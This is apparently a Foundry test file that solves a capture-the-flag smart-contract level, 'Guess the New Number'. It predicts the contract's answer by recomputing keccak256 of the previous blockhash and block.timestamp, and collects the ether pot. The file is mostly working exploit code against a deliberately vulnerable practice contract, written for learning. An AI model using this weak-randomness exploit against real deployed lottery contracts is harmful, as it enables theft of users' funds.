// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/lotteries/GuessTheNewNumber.sol";
import "forge-std/console.sol";

// forge test --match-contract GuessTheNewNumberTest -vvvv
contract GuessTheNewNumberTest is Test {
    address player = address(100);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testGuessTheNewNumberHack() public {
        /****************
         * Factory setup *
         *************** */
        GuessTheNewNumberChallenge guessTheNewNumber = new GuessTheNewNumberChallenge{
                value: 1 ether
            }();
        vm.startPrank(player);
        address levelAddress = address(guessTheNewNumber);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        /*
         * In this level, the answer changes based on:
         * block number and block.timestamp.
         * -- 1 --
         * In foundry, we have the helper function vm.roll to set the block height
         * We can then simply construct the answer based on the block.height we set.
         * -- 2 --
         * As we work only with Solidity in foundry we also have access to block.number
         *
         * NB: this is only available for test though.
         * With Cast we can get the block number: cast-block-number
         * https://book.getfoundry.sh/reference/cast/cast-block-number
         */
        // -- 1 --
        // vm.roll(5);
        // uint8 answer = uint8(
        //     uint256(
        //         keccak256(abi.encodePacked(blockhash(5 - 1), block.timestamp))
        //     )
        // );
        // -- 2 --
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        guessTheNewNumber.guess{value: 1 ether}(answer);
        uint256 finalPlayerBalance = player.balance;
        assertEq(finalPlayerBalance, 6 ether);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = guessTheNewNumber.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
